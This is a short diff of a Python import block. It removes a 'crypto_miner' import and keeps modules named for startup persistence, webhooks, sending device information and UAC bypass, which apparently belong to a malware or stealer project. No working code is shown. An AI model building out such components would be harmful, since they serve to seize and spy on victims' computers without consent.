@@ -24,7 +24,6 @@ from bin import _startup as startup
 from bin.games import get_games
 from bin.config import Config
 from bin.webhook import _WebhookX
-from bin.crypto_miner import miner
 from bin._random_string import *
 from bin.sysinf import send_device_information
 from bin.uac_bypass import GetSelf, IsAdmin, UACbypass
